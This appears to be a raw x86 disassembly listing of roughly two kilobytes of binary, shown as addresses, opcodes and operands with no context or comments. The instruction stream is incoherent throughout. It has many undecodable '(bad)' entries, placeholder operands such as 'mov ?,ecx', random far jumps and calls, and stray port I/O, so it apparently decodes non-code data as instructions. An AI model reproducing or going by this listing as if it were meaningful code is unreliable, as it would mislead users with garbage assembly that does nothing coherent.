  4028d4:	ins    DWORD PTR es:[edi],dx
  4028d5:	popa   
  4028d6:	arpl   WORD PTR [ecx-0x3b],dx
  4028d9:	ja     0x402870
  4028db:	or     al,0x5f
  4028dd:	jno    0x40286c
  4028df:	movhps xmm3,QWORD PTR [eax]
  4028e2:	push   ebx
  4028e3:	stos   BYTE PTR es:[edi],al
  4028e4:	mov    ch,0xdf
  4028e6:	mov    esi,0xdf9193a
  4028eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028ec:	adc    DWORD PTR [ebp+0x6ad06fc0],eax
  4028f2:	add    ah,bh
  4028f4:	enter  0x7d7b,0x79
  4028f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f9:	pop    esp
  4028fa:	ss xchg ecx,eax
  4028fc:	popf   
  4028fd:	push   0xe766fbaa
  402902:	xor    cl,bh
  402904:	mov    cl,0x3
  402906:	aas    
  402907:	lds    ebx,FWORD PTR fs:[edi-0x24]
  40290b:	data16 stc 
  40290d:	cmp    DWORD PTR [ebp+0x759f08c1],0x5ada3b85
  402917:	rcl    BYTE PTR [ecx],1
  402919:	int3   
  40291a:	pop    esp
  40291b:	jae    0x40298e
  40291d:	add    al,0x8f
  40291f:	(bad)  
  402920:	sub    DWORD PTR [esi-0x45e42e7],edx
  402926:	sbb    eax,0x18cc406
  40292b:	sub    DWORD PTR [esi],0x2d02c4df
  402931:	pop    edx
  402932:	cmp    BYTE PTR [edx+0x20],cl
  402935:	jecxz  0x4028ec
  402937:	and    al,0xd6
  402939:	addr16 mov ecx,0xd724fafc
  40293f:	jne    0x4028d9
  402941:	retf   
  402942:	adc    dh,dh
  402944:	mov    edi,0xa63c0e7e
  402949:	fwait
  40294a:	push   es
  40294b:	or     BYTE PTR [edx],dh
  40294d:	add    eax,0x6fc81753
  402952:	ficom  DWORD PTR [eax-0x37c104e6]
  402958:	cwde   
  402959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40295a:	jnp    0x4029a5
  40295c:	xchg   ebx,eax
  40295d:	cmc    
  40295e:	mov    esi,0x206fe50c
  402963:	jmp    0x7a5a:0xd1de3587
  40296a:	dec    DWORD PTR [eax+0x66d3ca2c]
  402970:	dec    ebx
  402971:	es push ecx
  402973:	aaa    
  402974:	xchg   edx,eax
  402975:	cmp    ebp,DWORD PTR ss:[esi+eiz*1+0x1c0acd1]
  40297d:	dec    esi
  40297e:	adc    eax,DWORD PTR [edi+ecx*2-0x304cd7ab]
  402985:	addr16 push 0x7b43b831
  40298b:	pop    edx
  40298c:	cmp    al,0x89
  40298e:	fisttp QWORD PTR [eax+0x15976430]
  402994:	rcl    ebp,1
  402996:	jns    0x40297c
  402998:	in     al,0x5c
  40299a:	dec    eax
  40299b:	jo     0x4029cb
  40299d:	push   ds
  40299e:	jp     0x402a05
  4029a0:	mov    esi,0xad8bdfa8
  4029a5:	mov    bl,bl
  4029a7:	add    eax,0xbe95f14d
  4029ac:	in     eax,0x61
  4029ae:	sbb    dh,BYTE PTR [ebx]
  4029b0:	mov    ecx,0x578638c9
  4029b5:	add    BYTE PTR [eax+0x2d],al
  4029b8:	aas    
  4029b9:	mov    ecx,0x9e252e57
  4029be:	shl    DWORD PTR [ebx-0x62],0x15
  4029c2:	bound  esi,QWORD PTR [edi-0x38]
  4029c5:	scas   eax,DWORD PTR es:[edi]
  4029c6:	or     ah,dh
  4029c8:	pop    esp
  4029c9:	lock std 
  4029cb:	jmp    0xc8b7:0x4a26b5a8
  4029d2:	push   edx
  4029d3:	or     DWORD PTR [esi-0x1cd6cdda],edx
  4029d9:	pusha  
  4029da:	push   0xffffff8e
  4029dc:	cs aad 0x63
  4029df:	rol    BYTE PTR [eax+0x2f],cl
  4029e2:	repnz dec esi
  4029e4:	mov    edi,0x1a9639a9
  4029e9:	jecxz  0x402a30
  4029eb:	mov    ds:0x85116f35,al
  4029f0:	pop    es
  4029f1:	(bad)  
  4029f2:	ds and al,ah
  4029f5:	test   BYTE PTR [ecx],al
  4029f7:	(bad)  
  4029f8:	mov    bl,0x9c
  4029fa:	push   ecx
  4029fb:	inc    ebx
  4029fc:	in     al,0x6
  4029fe:	mov    esp,edi
  402a00:	ret    
  402a01:	mov    ecx,0x13be4621
  402a06:	push   edx
  402a07:	sbb    BYTE PTR [edi+0x7c2b3065],ah
  402a0d:	call   0x726d7bd
  402a12:	push   ecx
  402a13:	dec    eax
  402a14:	xor    BYTE PTR ds:0x6cf6d1b4,cl
  402a1a:	clc    
  402a1b:	push   ds
  402a1c:	push   edx
  402a1d:	or     DWORD PTR [ebx+ebx*4+0x24fe44dd],eax
  402a24:	or     DWORD PTR [edi-0x50],ecx
  402a27:	inc    edi
  402a28:	mov    eax,0x352ff368
  402a2d:	xor    al,0xf9
  402a2f:	pop    ebx
  402a30:	push   0x66
  402a32:	dec    esi
  402a33:	popf   
  402a34:	xchg   DWORD PTR [ecx-0x2fbe8749],esp
  402a3a:	addr16 (bad) 
  402a3c:	mov    ebp,0xaaab260e
  402a41:	inc    ecx
  402a42:	(bad)  
  402a43:	sbb    DWORD PTR [esp+ebx*4+0x42],eax
  402a47:	and    DWORD PTR [edi],edi
  402a49:	ret    0x2f52
  402a4c:	push   eax
  402a4d:	rcr    DWORD PTR [ebx],1
  402a4f:	or     DWORD PTR [edx+ecx*4],edx
  402a52:	int3   
  402a53:	fadd   DWORD PTR [eax-0x2d]
  402a56:	mov    esp,0x2178cec4
  402a5b:	xor    cl,dh
  402a5d:	add    al,0x71
  402a5f:	inc    ecx
  402a60:	jne    0x402add
  402a62:	pop    ebx
  402a63:	cdq    
  402a64:	jge    0x402a3f
  402a66:	pop    esi
  402a67:	daa    
  402a68:	mov    ds:0x74f61dc6,eax
  402a6d:	(bad)  
  402a6e:	pop    ebp
  402a6f:	sbb    DWORD PTR [edi-0x3f],esp
  402a72:	aad    0x35
  402a74:	jmp    0xb23:0xc19c03e2
  402a7b:	cli    
  402a7c:	mov    al,ds:0xe4006faa
  402a81:	mov    al,ds:0xddf0f845
  402a86:	(bad)
  402a8a:	retf   
  402a8b:	mov    esi,DWORD PTR [ebp-0x42249561]
  402a91:	mov    DWORD PTR [ebp+0x305f3d69],ebp
  402a97:	dec    edi
  402a98:	mov    bl,0x5e
  402a9a:	jmp    0x91a5:0x63dcdff6
  402aa1:	mov    ?,ecx
  402aa3:	fs retf 
  402aa5:	cli    
  402aa6:	rol    BYTE PTR [ebx+0x5bb00eae],cl
  402aac:	jae    0x402a3e
  402aae:	aas    
  402aaf:	ds addr16 fdivr st(4),st
  402ab4:	sahf   
  402ab5:	pop    edi
  402ab6:	je     0x402a45
  402ab8:	ret    
  402ab9:	sbb    cl,BYTE PTR [edi]
  402abb:	dec    edi
  402abc:	mov    ecx,0x5cf3e820
  402ac1:	sbb    DWORD PTR [edx],esi
  402ac3:	scas   al,BYTE PTR es:[edi]
  402ac4:	(bad)  
  402ac5:	fistp  DWORD PTR [ebp+0x67]
  402ac8:	jecxz  0x402a75
  402aca:	stos   DWORD PTR es:[edi],eax
  402acb:	add    eax,0x610ff3f9
  402ad0:	into   
  402ad1:	fcom   st(5)
  402ad3:	in     al,0x96
  402ad5:	aad    0x62
  402ad7:	ins    BYTE PTR es:[edi],dx
  402ad8:	test   BYTE PTR [edi-0x6a095668],bh
  402ade:	xchg   ebp,eax
  402adf:	popa   
  402ae0:	push   0x1f32232b
  402ae5:	in     al,dx
  402ae6:	jle    0x402ad9
  402ae8:	shl    DWORD PTR [ecx+0x4cc58d8c],0x67
  402aef:	jp     0x402afe
  402af1:	rol    BYTE PTR [eax],cl
  402af3:	inc    esi
  402af4:	push   ss
  402af5:	dec    esi
  402af6:	xor    al,BYTE PTR [ebx]
  402af8:	mov    ecx,0x3f11a884
  402afe:	xor    ah,BYTE PTR [ecx+0x3501921e]
  402b04:	iret   
  402b05:	jle    0x402b62
  402b07:	sub    ch,BYTE PTR [edx-0x6f]
  402b0a:	hlt    
  402b0b:	addr16 or bl,ch
  402b0e:	repz mov esi,0x9f455d9e
  402b14:	sbb    al,0x42
  402b16:	pop    es
  402b17:	popf   
  402b18:	ss out dx,eax
  402b1a:	push   ecx
  402b1b:	sahf   
  402b1c:	mov    WORD PTR [ecx+0x1f],fs
  402b1f:	cmp    dl,al
  402b21:	xor    eax,0x18988399
  402b26:	shl    BYTE PTR [edx+0x45],0x79
  402b2a:	test   al,0x28
  402b2c:	mov    bh,0x3e
  402b2e:	test   al,0xbe
  402b30:	pop    ebp
  402b31:	xchg   bl,ah
  402b33:	dec    ebp
  402b34:	out    dx,eax
  402b35:	test   ebx,ebx
  402b37:	lock inc ecx
  402b39:	mov    esp,0x10e436cc
  402b3e:	xchg   DWORD PTR ds:0xf58d0cfe,esi
  402b44:	mov    bh,0x90
  402b46:	push   DWORD PTR [edi]
  402b48:	in     al,dx
  402b49:	sbb    eax,0x226eada5
  402b4e:	pop    esp
  402b4f:	jae    0x402ad8
  402b51:	add    eax,0x6f3996c2
  402b56:	out    0x67,eax
  402b58:	or     BYTE PTR [esi+0x3d],dh
  402b5b:	in     al,0x45
  402b5d:	or     al,BYTE PTR [eax]
  402b5f:	js     0x402b6c
  402b61:	jg     0x402b62
  402b63:	imul   edx,ecx,0xffffffda
  402b66:	mov    ebp,DWORD PTR [ecx-0x49]
  402b69:	or     esp,DWORD PTR [ebp+esi*8-0x54]
  402b6d:	idiv   DWORD PTR [esi+0x44]
  402b70:	mov    ds:0x69cde86a,eax
  402b75:	in     eax,0x9b
  402b77:	add    BYTE PTR [edx-0xdb176fe],bh
  402b7d:	dec    edi
  402b7e:	lods   eax,DWORD PTR ds:[esi]
  402b7f:	out    0xf8,al
  402b81:	cwde   
  402b82:	(bad)  [esp+edi*1-0x5a]
  402b86:	outs   dx,BYTE PTR ds:[esi]
  402b87:	fnstenv [edx]
  402b89:	xlat   BYTE PTR ds:[ebx]
  402b8a:	dec    edi
  402b8b:	or     esp,DWORD PTR [ebp*1+0x2b6ae98e]
  402b92:	mov    dl,0xe5
  402b94:	iret   
  402b95:	mov    eax,0x8d406565
  402b9a:	in     eax,dx
  402b9b:	mov    cl,BYTE PTR [edx+0x6f]
  402b9e:	ins    DWORD PTR es:[edi],dx
  402b9f:	inc    eax
  402ba0:	ret    
  402ba1:	sub    eax,0x41c7462a
  402ba6:	fnstenv [eax+0x61]
  402ba9:	push   edi
  402baa:	iret   
  402bab:	out    0x28,al
  402bad:	cdq    
  402bae:	fwait
  402baf:	jno    0x402b67
  402bb1:	inc    esi
  402bb2:	cld    
  402bb3:	loop   0x402b41
  402bb5:	push   edi
  402bb6:	inc    edx
  402bb7:	sbb    al,0x10
  402bb9:	mov    ebp,0x5be993b0
  402bbe:	pop    esp
  402bbf:	ss mov esp,ebx
  402bc2:	test   eax,0x5193ccb0
  402bc7:	ficomp DWORD PTR ds:0x87980efc
  402bcd:	mov    ebp,0x6e09572b
  402bd2:	mov    ds:0xeebb11ca,al
  402bd7:	xor    eax,0xbfa949b8
  402bdc:	js     0x402bba
  402bde:	dec    esi
  402bdf:	(bad)  
  402be0:	jae    0x402beb
  402be2:	daa    
  402be3:	mov    eax,0xca688b8f
  402be8:	int3   
  402be9:	retf   
  402bea:	dec    edi
  402beb:	xlat   BYTE PTR ds:[ebx]
  402bec:	ficom  DWORD PTR [edx-0x62]
  402bef:	cld    
  402bf0:	cld    
  402bf1:	stos   DWORD PTR es:[edi],eax
  402bf2:	jns    0x402ba0
  402bf4:	cld    
  402bf5:	inc    eax
  402bf6:	lea    ebx,[eax]
  402bf8:	mov    dh,0xef
  402bfa:	rol    DWORD PTR [eax],1
  402bfc:	or     eax,0xfc25a50e
  402c01:	mov    bh,ch
  402c03:	push   0x1b4d262d
  402c08:	dec    ebx
  402c09:	stos   BYTE PTR es:[edi],al
  402c0a:	popa   
  402c0b:	popa   
  402c0c:	repnz imul ebp,DWORD PTR [ecx+edx*2+0x1bd4d0ba],0x4d35620d
  402c18:	adc    DWORD PTR [edx-0x7a835415],0xd94f2aa0
  402c22:	fwait
  402c23:	rcl    DWORD PTR ds:0x884defd0,0x6c
  402c2a:	ret    
  402c2b:	pop    ds
  402c2c:	adc    BYTE PTR [esp+ebp*8-0x601ebed9],cl
  402c33:	cmp    al,0xa3
  402c35:	das    
  402c36:	fadd   st,st(3)
  402c38:	cwde   
  402c39:	push   esp
  402c3a:	push   esp
  402c3b:	fst    DWORD PTR [ebx+ebp*8-0x12a9f07e]
  402c42:	setae  cl
  402c45:	fsubr  DWORD PTR [ebx-0x26]
  402c48:	stc    
  402c49:	xchg   DWORD PTR [edx],esi
  402c4b:	mov    ah,0xbc
  402c4d:	test   DWORD PTR [ecx-0x28],esp
  402c50:	in     al,dx
  402c51:	das    
  402c52:	in     eax,0x93
  402c54:	out    0x5f,eax
  402c56:	dec    eax
  402c57:	ret    
  402c58:	test   eax,0xcafbe3da
  402c5d:	cmc    
  402c5e:	loope  0x402cd3
  402c60:	adc    eax,0xc54fa6aa
  402c65:	and    DWORD PTR [edx+0x21b63aaf],eax
  402c6b:	or     dh,BYTE PTR [ebp+0x47]
  402c6e:	sbb    eax,0x12e96722
  402c73:	mov    bl,0x79
  402c75:	test   DWORD PTR [edx-0x5bb417e7],0x99e8de20
  402c7f:	sahf   
  402c80:	pop    ds
  402c81:	retf   0xf581
  402c84:	inc    esp
  402c85:	xchg   BYTE PTR ds:0xdb006d10,dl
  402c8b:	js     0x402c2f
  402c8d:	jecxz  0x402d06
  402c8f:	dec    eax
  402c90:	js     0x402c6b
  402c92:	fiadd  WORD PTR [ecx]
  402c94:	stc    
  402c95:	mov    WORD PTR [esi+ebx*8-0x4d],cs
  402c99:	stos   BYTE PTR es:[edi],al
  402c9a:	shr    BYTE PTR [ebx],1
  402c9c:	cmp    ch,BYTE PTR [ebp-0x127d06a2]
  402ca2:	sti    
  402ca3:	fs push edx
  402ca5:	paddsw mm7,QWORD PTR gs:[edx-0x76]
  402caa:	sahf   
  402cab:	nop
  402cac:	inc    BYTE PTR [eax-0xb233122]
  402cb2:	out    0xbf,al
  402cb4:	gs or  eax,0xcad1f261
  402cba:	sbb    DWORD PTR [ebp+ecx*1+0x3],0xffffffb5
  402cbf:	loopne 0x402cef
  402cc1:	call   0xda79c1e2
  402cc6:	sahf   
  402cc7:	mov    ch,0x30
  402cc9:	xlat   BYTE PTR ds:[ebx]
  402cca:	inc    esp
  402ccb:	xchg   edx,eax
  402ccc:	gs fucom st(2)
  402ccf:	jo     0x402cb6
  402cd1:	arpl   WORD PTR [esi],dx
  402cd3:	sbb    BYTE PTR [edi-0x1f74094b],bh
  402cd9:	jno    0x402d34
  402cdb:	or     ah,BYTE PTR [ebx+eax*4-0x49864901]
  402ce2:	stc    
  402ce3:	mov    ch,0x15
  402ce5:	xor    BYTE PTR [edi-0x57],bh
  402ce8:	(bad)  
  402cea:	sub    DWORD PTR [ebx+0x70],ecx
  402ced:	jne    0x402c9a
  402cef:	fadd   DWORD PTR [ebx+ebp*2+0x156d5e79]
  402cf6:	pop    edi
  402cf7:	push   esp
  402cf8:	loopne 0x402d20
  402cfa:	jo     0x402d20
  402cfc:	xchg   DWORD PTR [edi-0x5c53e791],edx
  402d02:	push   esp
  402d03:	and    BYTE PTR [ecx],ch
  402d05:	push   esp
  402d06:	adc    ebx,DWORD PTR [ebp-0x5eed1908]
  402d0c:	mov    dl,0xa1
  402d0e:	iret   
  402d0f:	adc    DWORD PTR [esi+0x4d],edx
  402d12:	adc    ebp,ebx
  402d14:	jl     0x402d0f
  402d16:	pop    ds
  402d17:	xchg   ebp,eax
  402d18:	fwait
  402d19:	mov    WORD PTR [edx-0x65],gs
  402d1c:	out    dx,eax
  402d1d:	pop    eax
  402d1e:	test   eax,0x84a964d2
  402d23:	test   eax,0x64acacc5
  402d28:	mov    ch,0x7e
  402d2a:	push   ds
  402d2b:	jmp    0xcaaa:0x99a35a32
  402d32:	dec    ebx
  402d33:	and    edx,esi
  402d35:	mov    al,ds:0x33bc2e8d
  402d3a:	mov    cl,0x5b
  402d3c:	stos   BYTE PTR es:[edi],al
  402d3d:	lahf   
  402d3e:	mov    edx,0x8c77db38
  402d43:	xchg   eax,ebx
  402d45:	sub    BYTE PTR [ebp-0x1c7be86c],bl
  402d4b:	jle    0x402cd8
  402d4d:	pop    es
  402d4e:	ds pop esp
  402d50:	frstor [ebp+0x7592a517]
  402d56:	les    ebp,FWORD PTR [ebx]
  402d58:	sbb    ch,BYTE PTR [edx]
  402d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d5b:	(bad)  
  402d5c:	push   edx
  402d5d:	jl     0x402dc7
  402d5f:	(bad)  
  402d61:	(bad)  
  402d62:	outs   dx,BYTE PTR ds:[esi]
  402d63:	mov    ebp,0xd190d0d0
  402d68:	into   
  402d69:	adc    esp,ecx
  402d6b:	mov    BYTE PTR [eax],dl
  402d6d:	shl    DWORD PTR [esi-0x52],0x19
  402d71:	enter  0xb2bb,0x85
  402d75:	pop    es
  402d76:	ss mov ah,0xfa
  402d79:	sub    eax,0xde34a388
  402d7e:	out    0x4d,al
  402d80:	out    dx,al
  402d81:	dec    edx
  402d82:	loope  0x402d86
  402d84:	lods   al,BYTE PTR ds:[esi]
  402d85:	push   edx
  402d86:	mul    BYTE PTR [ebx-0x20af6ab7]
  402d8c:	dec    esi
  402d8d:	lea    esp,[ebp+0x0]
  402d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d91:	and    DWORD PTR [esi],edx
  402d93:	pusha  
  402d94:	lds    ebp,FWORD PTR [ebx]
  402d96:	xor    cl,BYTE PTR [ebp+0x2179e584]
  402d9c:	cmp    DWORD PTR [esi*2+0x256219be],ebp
  402da3:	jg     0x402dd5
  402da5:	xor    edi,DWORD PTR [ebp+0x6c]
  402da8:	into   
  402da9:	jge    0x402dc3
  402dab:	push   edx
  402dac:	in     al,dx
  402dad:	(bad)  
  402dae:	pop    sp
  402db0:	int3   
  402db1:	mov    ds:0x861dfc16,eax
  402db6:	bound  ebx,QWORD PTR [esi-0x576527a]
  402dbc:	add    BYTE PTR [eax-0x69e512af],ah
  402dc2:	(bad)  
  402dc3:	stos   BYTE PTR es:[edi],al
  402dc4:	(bad)  
  402dc6:	aaa    
  402dc7:	stos   BYTE PTR es:[edi],al
  402dc8:	pop    ds
  402dc9:	or     esp,DWORD PTR [edi]
  402dcb:	(bad)  
  402dcc:	test   ebx,ebp
  402dce:	sub    BYTE PTR [edi],dh
  402dd0:	daa    
  402dd1:	jnp    0x402dbc
  402dd3:	jmp    0x402df3
  402dd5:	adc    eax,0xd364cdee
  402dda:	sub    al,BYTE PTR [esi]
  402ddc:	cmp    DWORD PTR [edi+eiz*2-0x28],esp
  402de0:	jl     0x402df1
  402de2:	cmp    eax,0x8cebc376
  402de7:	outs   dx,BYTE PTR ds:[esi]
  402de8:	cld    
  402de9:	pop    ds
  402dea:	sbb    al,0xb8
  402dec:	inc    ecx
  402ded:	inc    edx
  402dee:	mov    dl,0xce
  402df0:	test   BYTE PTR [ebp+0x15],dh
  402df3:	inc    ecx
  402df4:	std    
  402df5:	ficom  DWORD PTR [edi]
  402df7:	or     BYTE PTR [edx-0x1919ed7a],ch
  402dfd:	into   
  402dfe:	mov    edx,esi
  402e00:	lahf   
  402e01:	ss fmulp st(1),st
  402e04:	lahf   
  402e05:	or     al,0xd1
  402e07:	imul   edi,DWORD PTR [edx+0x51041ec3],0xffffff8d
  402e0e:	cdq    
  402e0f:	mov    BYTE PTR [eax+0xc],bh
  402e12:	pmuludq mm4,QWORD PTR [esi+0x1bd6624d]
  402e19:	in     eax,0x4e
  402e1b:	imul   esp,esi,0x3da884c
  402e21:	shl    DWORD PTR [esi+0x7ada338d],0x70
  402e28:	leave  
  402e29:	xor    dl,BYTE PTR [esi-0x80]
  402e2c:	adc    eax,0xef404f35
  402e31:	xor    DWORD PTR [edx],eax
  402e33:	(bad)  
  402e34:	cmp    DWORD PTR [edi+0x7be4c872],esp
  402e3a:	inc    edx
  402e3b:	rcl    DWORD PTR [ebx+0x53dba939],1
  402e41:	test   al,0x8f
  402e43:	jecxz  0x402e97
  402e45:	xchg   esp,eax
  402e46:	sbb    dh,BYTE PTR [edx-0x53]
  402e49:	das    
  402e4a:	repz pop ebp
  402e4c:	js     0x402e80
  402e4e:	push   ds
  402e4f:	cmp    al,0x50
  402e51:	sub    al,al
  402e53:	jo     0x402e56
  402e55:	lock push ss
  402e57:	leave  
  402e58:	mov    cs,WORD PTR [ebp-0x31]
  402e5b:	scas   eax,DWORD PTR es:[edi]
  402e5c:	fptan  
  402e5e:	adc    al,0x41
  402e60:	retf   0x6557
  402e63:	leave  
  402e64:	addr16 loop 0x402ebd
  402e67:	ror    DWORD PTR [ebp-0x7023c3cd],1
  402e6d:	outs   dx,BYTE PTR ds:[esi]
  402e6e:	ja     0x402e68
  402e70:	test   ebp,ecx
  402e72:	sub    BYTE PTR ds:0xbfae58b8,dh
  402e78:	pushf  
  402e79:	stc    
  402e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e7b:	xchg   edx,eax
  402e7c:	inc    ebp
  402e7d:	test   al,0x9a
  402e7f:	cld    
  402e80:	stos   DWORD PTR es:[edi],eax
  402e81:	pop    es
  402e82:	call   0x252c:0xcfe80134
  402e89:	fcom   DWORD PTR [ebp+0x4358f990]
  402e8f:	call   0xa152420f
  402e94:	xchg   edi,eax
  402e95:	jmp    0x40fc:0xe7083c51
  402e9c:	mov    ds:0xbde70982,eax
  402ea1:	movhps QWORD PTR [edi+eiz*4-0x15],xmm3
  402ea6:	repz or eax,0xe5e465ce
  402eac:	clc    
  402ead:	push   ecx
  402eae:	sub    esp,DWORD PTR [edi]
  402eb0:	rcl    BYTE PTR [eax],0xdf
  402eb3:	jle    0x402e3d
  402eb5:	fnstcw WORD PTR [eax+0x3e214e84]
  402ebb:	lods   al,BYTE PTR ds:[esi]
  402ebc:	cmp    ebp,ecx
  402ebe:	int3   
  402ebf:	mov    eax,0x5806c4a9
  402ec4:	dec    edx
  402ec5:	imul   ecx,DWORD PTR [esi+ebx*2+0x3e71f849],0xffffffa8
  402ecd:	sar    DWORD PTR [edi-0x5be1e5b0],cl
  402ed3:	outs   dx,BYTE PTR ds:[esi]
  402ed4:	xchg   DWORD PTR [edx+0x7d10802d],ecx
  402eda:	in     al,0xba
  402edc:	(bad)  
  402ede:	sti    
  402edf:	inc    DWORD PTR [ecx-0x24bf6844]
  402ee5:	jns    0x402e92
  402ee7:	add    al,0x2f
  402ee9:	scas   al,BYTE PTR es:[edi]
  402eea:	lock mov ah,0x71
  402eed:	and    esp,esi
  402eef:	add    al,al
  402ef1:	loope  0x402ee9
  402ef3:	ja     0x402f47
  402ef5:	(bad)  
  402ef6:	mov    edi,0x2656a4ab
  402efb:	push   esp
  402efc:	aam    0xa9
  402efe:	push   ss
  402eff:	sbb    DWORD PTR [eax-0x21ac403f],edi
  402f05:	push   0x3ffcb636
  402f0a:	sub    eax,0xa1ce06b1
  402f0f:	or     esi,DWORD PTR [ecx]
  402f11:	lds    esi,FWORD PTR [esi]
  402f13:	js     0x402ea2
  402f15:	sar    BYTE PTR [ebp+ebp*2-0x72],cl
  402f19:	rol    BYTE PTR [edi-0x3b],1
  402f1c:	loopne 0x402eaa
  402f1e:	mov    edi,0xf02fa974
  402f23:	add    eax,0xe6a13ffb
  402f28:	ret    0x110c
  402f2b:	cs mov cl,0x76
  402f2e:	cmc    
  402f2f:	ins    DWORD PTR es:[edi],dx
  402f30:	mov    ds:0x96a949af,al
  402f35:	inc    edx
  402f36:	mov    dh,0x63
  402f38:	jmp    0xbc74a561
  402f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3e:	jl     0x402ec7
  402f40:	outs   dx,BYTE PTR ds:[esi]
  402f41:	xor    eax,0xe9412e4a
  402f46:	xor    eax,0xf5d34602
  402f4b:	(bad)  
  402f4c:	es icebp 
  402f4e:	scas   al,BYTE PTR es:[edi]
  402f4f:	cld    
  402f50:	push   esi
  402f51:	mov    esp,0xb3a1c0e6
  402f56:	cmp    DWORD PTR [eax-0x2c],ebp
  402f59:	sub    dh,BYTE PTR [esi]
  402f5b:	jo     0x402f97
  402f5d:	call   0x3c5:0x6699ecde
  402f64:	sub    DWORD PTR [bx+si+0xc3a],esp
  402f69:	adc    ebx,esi
  402f6b:	out    0xc9,al
  402f6d:	dec    edi
  402f6e:	inc    ebp
  402f6f:	pop    eax
  402f70:	jp     0x402f48
  402f72:	lea    ecx,[edi+0x69]
  402f75:	test   ecx,esp
  402f77:	pop    esi
  402f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f79:	inc    esi
  402f7a:	test   eax,0xac1ffa53
  402f7f:	mov    bl,0xfa
  402f81:	and    BYTE PTR [esi+0x23],0x52
  402f85:	clc    
  402f86:	fwait
  402f87:	mov    esp,0x2caea60f
  402f8c:	addr16 aad 0xad
  402f8f:	and    esp,DWORD PTR [eax]
  402f91:	imul   edx,ecx,0x3d
  402f94:	inc    ecx
  402f95:	repz arpl WORD PTR [eax+0xb],dx
  402f99:	dec    sp
  402f9b:	dec    eax
  402f9c:	retf   
  402f9d:	fsubrp st(7),st
  402f9f:	jns    0x40301c
  402fa1:	mov    edx,0x703dbe0e
  402fa6:	mov    BYTE PTR [esi+0x7b0fc6a3],dl
  402fac:	jb     0x402fd5
  402fae:	inc    BYTE PTR [edx+0x52]
  402fb1:	xchg   bl,bh
  402fb3:	clc    
  402fb4:	cli    
  402fb5:	or     al,0xdf
  402fb7:	test   BYTE PTR [ebx+esi*8],cl
  402fba:	push   edi
  402fbb:	cmp    bl,BYTE PTR [edx-0x7ed2f880]
  402fc1:	mov    esp,0xa31f4018
  402fc6:	pop    edi
  402fc7:	xchg   esi,eax
  402fc8:	imul   esp,DWORD PTR [edx+0x28],0xd359d5b0
  402fcf:	dec    DWORD PTR [ebp-0x78762eb]
  402fd5:	lods   eax,DWORD PTR ds:[esi]
  402fd6:	xchg   ecx,eax
  402fd7:	or     DWORD PTR [ecx],ecx
  402fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fda:	or     DWORD PTR [edx+0x46c1fad3],0xc5b32f77
  402fe4:	push   ecx
  402fe5:	ret    0x39bc
  402fe8:	mov    eax,ds:0xc5489431
  402fed:	ficom  WORD PTR [eax+0x24]
  402ff0:	daa    
  402ff1:	in     al,0x3
  402ff3:	cld    
  402ff4:	push   esi
  402ff5:	fcom   DWORD PTR [edi]
  402ff7:	iret   
  402ff8:	mov    ebx,0xafc8e807
  402ffd:	lahf   
  402ffe:	cmp    edi,ecx
  403000:	int3   
  403001:	add    DWORD PTR [ebx+esi*4-0x13],edx
  403005:	jns    0x403020
  403007:	in     al,0xf2
  403009:	xchg   edi,eax
  40300a:	inc    esi
  40300b:	imul   ebx,DWORD PTR [ebp-0x7b6878ca],0xaf125ef0
  403015:	lahf   
  403016:	(bad)  [edi-0x3f]
  403019:	inc    ecx
  40301a:	loop   0x403088
  40301c:	popa   
  40301d:	fs inc esi
  40301f:	cmp    esp,DWORD PTR [edi+0x3c15aca1]
  403025:	cld    
  403026:	clc    
  403027:	jb     0x403097
  403029:	adc    al,0x88
  40302b:	inc    ebx
  40302c:	pop    es
  40302d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302e:	pushf  
  40302f:	repnz push esp
  403031:	jb     0x403029
  403033:	popf   
  403034:	sbb    bh,BYTE PTR [esi+0x28]
  403037:	pop    edx
  403038:	jle    0x403048
  40303a:	loopne 0x403010
  40303c:	jae    0x40305d
  40303e:	(bad)  
  40303f:	(bad)  
  403040:	int    0x9b
  403042:	inc    edi
  403043:	add    eax,0x13744c07
  403048:	add    DWORD PTR [edi-0x27],ecx
  40304b:	jne    0x402fe7
  40304d:	or     DWORD PTR [esi+0x6b95ab28],edi
  403053:	jge    0x4030cf
  403055:	mov    al,ds:0x7202e226
  40305a:	and    DWORD PTR [edi-0x4e],eax
  40305d:	enter  0x8635,0x47
  403061:	jmp    0x9032:0x9c1fb39d
  403068:	jl     0x403048
  40306a:	mov    ch,0x69
  40306c:	call   0x9ffd:0xbe9a11e2
  403073:	mov    esp,0xade54904
  403078:	jl     0x4030c2
  40307a:	sbb    eax,0x3d9b7944
  40307f:	shr    cl,1
  403081:	rcl    DWORD PTR [ecx],1
  403083:	loop   0x403057
  403085:	loopne 0x403019
  403087:	or     ebp,DWORD PTR [esi]
  403089:	adc    eax,0x7a2f8bc4
  40308e:	fwait
  40308f:	mov    ds:0x45134e23,al
  403094:	jnp    0x403034
  403096:	shr    BYTE PTR [ebx],cl
  403098:	idiv   BYTE PTR [ecx]
  40309a:	stc    
  40309b:	dec    ebx
  40309c:	jp     0x40307a
  40309e:	dec    ecx
  40309f:	mov    ?,edx
  4030a1:	dec    esp
  4030a2:	loopne 0x40311a
  4030a4:	pop    esp
  4030a5:	ins    DWORD PTR es:[edi],dx
  4030a6:	sti    
  4030a7:	std    
  4030a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a9:	add    dh,dh
  4030ab:	jmp    0xbf01:0x25ee4436
  4030b2:	sbb    ecx,ebx
  4030b4:	repnz imul edi,eax,0xffffff95
  4030b8:	int3   
  4030b9:	popa   
  4030ba:	inc    edi
  4030bb:	adc    edi,esp
  4030bd:	pusha  
  4030be:	jp     0x4030b1
  4030c0:	xchg   BYTE PTR [eax+0x19cb270c],ah
  4030c6:	mov    al,0x53
  4030c8:	ins    DWORD PTR es:[edi],dx
  4030c9:	mov    eax,ds:0xf6691b45
  4030ce:	xlat   BYTE PTR ds:[ebx]
  4030cf:	push   ebx
  4030d0:	cli    
